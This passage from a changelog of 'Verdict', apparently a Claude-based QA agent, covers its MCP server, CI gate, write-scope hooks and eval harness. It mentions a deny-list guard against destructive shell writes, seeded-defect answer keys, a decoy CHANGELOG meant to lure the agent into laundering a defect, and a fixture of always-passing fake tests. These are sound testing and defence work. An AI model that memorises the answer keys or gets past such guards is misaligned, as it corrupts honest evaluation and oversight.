  (`--max-age-hours`, `--min-run-number`). Stdlib-only and runnable as a bare script;
  formats: `text`, `json`, `github-comment` (sticky marker), `github-output`.
- **GitHub Action** ([action.yml](action.yml)): gate mode with zero installs, zero keys,
  zero model — reads committed `.qa/` state, sets job status, maintains one sticky PR
  comment with the REGRESSED-first findings table. Experimental run mode executes a
  headless Verdict pass first, on `anthropic-api-key` or a subscription
  `claude-oauth-token` (self-hosted runners), with `anthropic-base-url` passthrough;
  optional `.qa/` commit-back.
- **MCP `get_report` + `get_profile`**: report content (path-guarded to the QA root,
  symlink-safe, 512 KB cap) and the profile — consumers can quote the evidence, not just
  link it.
- **Stdlib core extracted**: `verdict_mcp.state` (loading/resolution/ordering, shared by
  server and gate) and `verdict_mcp.project_key` — the reference implementation of
  [docs/project-key.md](docs/project-key.md), tested against its decision table
  (worktrees, detached HEAD, bare repos, non-git).
- **Loop race closed**: the documented driver asserts `run_number` advanced
  (`--min-run-number` as a CLI); [docs/nightly.md](docs/nightly.md) ships the
  cron/systemd/subscription-token recipe for nightly runs on your own machine.

## 0.4.0 — 2026-08-27 · "the tested tester, for real"

The security control and the flagship behavior are now tested — by machines.

- **Strict-mode Bash guard** ([hooks/enforce_bash_scope.py](hooks/enforce_bash_scope.py)):
  under `VERDICT_STRICT=1`, the obvious Bash write channels — output redirection, `tee`,
  `sed -i`, `rm`/`mv`/`cp` and friends, mutating `git` verbs — are denied when the target
  lies outside the QA root. A deny-heuristic, not a sandbox; the README states exactly
  which.
- **Hook test suite** ([tests/test_hooks.py](tests/test_hooks.py)): traversal escapes,
  `$VERDICT_HOME`, strict/non-strict matrix, chained commands, unresolved variables,
  fail-open on garbage input. Both hooks now share one path predicate
  ([hooks/qa_paths.py](hooks/qa_paths.py)) that honors `$VERDICT_HOME`.
- **Deterministic eval scorer** ([eval/score.py](eval/score.py) + machine answer keys):
  scores the state file, not the prose; hard-fails on a modified fixture, missing
  state/report, a laundered pass, or a forbidden phrase. Unit-tested like any other code.
- **Delta eval** — the flagship finally has a test:
  [fixtures/pricer_rev_b](eval/fixtures/pricer_rev_b) plus an authored golden run-2
  history; one run must produce `REGRESSED` (ranked first), `NEW`, `STILL_OPEN`,
  `RESOLVED`, and release an expired quarantine, against a CHANGELOG decoy that tries to
  launder the new defect. The committed rev-A→rev-B diff is CI-checked for drift.
- **Adversarial honesty fixture** ([fixtures/liar](eval/fixtures/liar)): an always-green
  test script, a skip-everything conftest, a mock-asserting test, a tautology — and the
  real defect they hide.
- **Eval harness** ([eval/run_eval.py](eval/run_eval.py)): isolated scratch repo, scratch
  `VERDICT_HOME`, `--setting-sources project`; `baseline` | `seeded` | `live` modes.
- **CI**: pytest matrix (3.10/3.13 × ubuntu/windows) and delta-diff freshness on every
  push; model-run evals are weekly/dispatch-only and never gate a PR.

## 0.3.0 — 2026-08-27 · "trust the memory"

Correctness release: everything the delta memory depends on is now specified mechanically
instead of by prose that drifted in practice.

- **Project key is derived, not guessed.** §0 now carries a mechanical rule (main-worktree
  basename, lowercased, sanitized) with a normative decision table in
  [docs/project-key.md](docs/project-key.md) — running from a git worktree no longer mints a
  variant key and fragments the baseline (observed live before this fix). Once a QA root
  exists, its recorded key is authoritative; repo renames are surfaced as a human decision,
  never healed by minting a second root.
- **`$VERDICT_HOME` honored by the agent**, matching the MCP server, so state can be
  relocated (and evals isolated) — resolved operationally in §0 via
  `${VERDICT_HOME:-$HOME/.claude/verdict}`, because an agent cannot know an environment
  variable without asking the shell (caught live by the eval harness).
- **`FLAKY` vs `BRITTLE_TEST` boundary sharpened** (§3): FLAKY is *undiagnosed*
  intermittence and quarantine is diagnosis deferred; a diagnosed mechanism (time-seeded
  input, order dependence) is a brittle test with a fix task, inside the verdict. The
  baseline answer key accepts both routes for the seeded flake, amendment documented.
- **`failure_classification` is part of the finding shape** (§6 + schema): machine
  consumers — the eval scorer, the gate — read the field, never the prose.
- **Timestamps are measured, never remembered.** Every date the agent writes comes from
  `date -u` — fabricated `T00:00:00Z` timestamps had been corrupting age/expiry math.
- **Corrupted `state.json` is preserved**, renamed `state.json.corrupt-<date>`, filed as a
  finding, and followed by a declared re-baseline — never silently overwritten.
- **The report artifact is non-waivable.** A caller may narrow scope; no caller may talk the
  agent out of writing the report file.
- **Profile stub on every baseline run**, with a machine-checkable header
  (`Project-Key` / `Repo-Path` / `Repo-Remote`) — baselines reached via `/qa-review` no
  longer skip profile creation.
- **Write-collision detection**: state is re-read immediately before the final write; a
  moved `run_number` aborts the write and reports the collision.
- **Duration gate is measurable**: gates and tests may record `duration_s` (additive,
  schema stays v1); the week-over-week duration gate cites it or declares itself
  unmeasurable.
- **`hash` vs `id` semantics fixed in prose**: `hash` recognizes a finding across runs;
  `id` is minted once and never renumbered.
- **INDEX gains a Blocker column** (`Findings (B/C/M/m)`) for new indexes; existing files
  keep their header per the match-columns rule.
- **MCP server**: severity ranking is case-insensitive; Windows drive paths (`C:/…`,
  `C:\…`) are recognized as paths; solo key lookup falls back to lowercase.
- Previous-run `next_run_focus` items must now be explicitly addressed each run.

## 0.2.2 — 2026-08-26

- Test design: 24-technique catalog with risk triggers ([docs/test-design.md](docs/test-design.md)).

## 0.2.1 — 2026-08-26

- Docs: the fix loop — Verdict as gate, never actor.

## 0.2.0 — 2026-08-25

- `verdict-mcp`: read-only MCP server over the QA state (verdicts, findings, quarantine,
  history).

## 0.1.0 — 2026-08-24

- Initial release: skeptical QA agent with memory — baseline → delta runs, five-class
  failure classification, flaky quarantine with expiry, four-verdict contract, write-scope
  hook, seeded-defect eval with published answer key (first published run 8/8).
